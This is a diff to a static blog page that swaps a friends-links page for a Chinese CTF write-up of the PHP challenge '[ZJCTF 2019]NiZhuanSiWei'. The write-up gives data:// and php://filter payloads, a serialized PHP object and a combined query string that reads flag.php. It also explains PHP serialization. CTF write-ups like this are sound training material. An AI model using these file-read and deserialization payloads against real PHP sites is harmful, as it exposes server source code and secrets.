@@ -2,10 +2,9 @@
 <html>
 
 <head>
-    
-                <meta charset="utf-8" />
+    <meta charset="utf-8" />
 <title>
-    Friends | Ro1ing
+    Ro1ing
 </title>
 <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
@@ -46,7 +45,6 @@
                                 })();
                             </script>
                             
-                    
 </head>
 
 <body>
@@ -162,34 +160,209 @@
                 <div class="container">
                     <article class="post-wrap">
                         <header class="post-header">
-                            <h1 class="post-title zh">
-                                &#x53CB;&#x94FE;
+                            <h1 class="post-title">
+                                 [ZJCTF 2019]NiZhuanSiWei
                             </h1>
-                            <h1 class="post-title en">
-                                Friends
-                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        Ro1ing
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-01-30</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.8
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">364</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://Ro1ing.github.io/tag/T4AXz5C92/">PHP</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/a1PMNYby40/">反序列化</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
                         </header>
+                        
                         <div class="post-content">
+                            <p>代码审计<br>
+查看一下useless.php --只有注释信息 没有用<br>
+利用data协议绕过<br>
+将welcome to the zjctf写入<br>
+而data://协议允许读入<br>
+payload：</p>
+<blockquote>
+<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
+</blockquote>
+<p>到这里就不会了 只有看下wp了</p>
+<p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p>
+<p>利用filter来进行读取指定文件</p>
+<p>payload：</p>
+<blockquote>
+<p>file=php://filter/read=convert.base64-encode/resource=useless.php</p>
+</blockquote>
+<p>得到 base64解码</p>
+<pre><code class="language-php">&lt;?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+<p>将flag调用，然后给里面file值赋值为flag.php。<br>
+序列化后传入password，应该就会出flag。</p>
+<blockquote>
+<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+</blockquote>
+<p>三者结合</p>
+<p>payload：</p>
+<blockquote>
+<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+</blockquote>
+<p>得到flag</p>
+<p>知识点：</p>
+<p><strong>序列号与反序列化</strong>知识：</p>
+<p>https://www.jianshu.com/p/631606cc5b76</p>
+<p>https://www.cnblogs.com/20175211lyz/p/11403397.html</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">结构结构</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">String(字符串)</td>
+<td style="text-align:center">s:size:value;</td>
+</tr>
+<tr>
+<td style="text-align:center">Integer(整型)</td>
+<td style="text-align:center">i:value;</td>
+</tr>
+<tr>
+<td style="text-align:center">Boolean(布尔型)</td>
+<td style="text-align:center">b:value;(保存1或0)</td>
+</tr>
+<tr>
+<td style="text-align:center">Null</td>
+<td style="text-align:center">N;</td>
+</tr>
+<tr>
+<td style="text-align:center">Array(列)</td>
+<td style="text-align:center">a:size:{key definition;value definition;(repeated per element)}</td>
+</tr>
+<tr>
+<td style="text-align:center">Object</td>
+<td style="text-align:center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td>
+</tr>
+</tbody>
+</table>
+<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+<p>例如这里，O代表对象，4为对象长度，1代表有一个成员变量。</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                
+                            </div>
                             
                                 
-                                    <div class="friend-box">
-                                        <img class="friend-avatar" src="https://blog.itjoker.cn/images/avatar.png">
-                                        <div class="flink-info">
-                                            <a href="https://blog.itjoker.cn" target="_blank">
-                                                ITJoker
-                                            </a>
-                                            <br />
-                                            ITJoker&#39;s Blog
-                                        </div>
-                                    </div>
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>Ro1ing</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://Ro1ing.github.io/post/buuctf-web/">https://Ro1ing.github.io/post/buuctf-web/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                        </div>
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/buuctf-web/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/buuctf-web/&sharesource=qzone&title= [ZJCTF 2019]NiZhuanSiWei&pics=https://Ro1ing.github.io/images/avatar.png?v=1611987745664&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/buuctf-web/&sharesource=weibo&title= [ZJCTF 2019]NiZhuanSiWei + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1611987745664 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://Ro1ing.github.io/tag/T4AXz5C92/">#
+                                                PHP
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/a1PMNYby40/">#
+                                                反序列化
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
+                                                CTF
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">
+                                                                                            [极客大挑战 2019]LoveSQL
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/">
+                                                                                                    静态网站和动态网站的区别
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
                     </article>
                 </div>
+                
+                                            
             </div>
-            
-                                        
+    </div>
+    </div>
     </div>
     
     <div id="player"></div>
@@ -270,6 +443,10 @@
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
+        </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
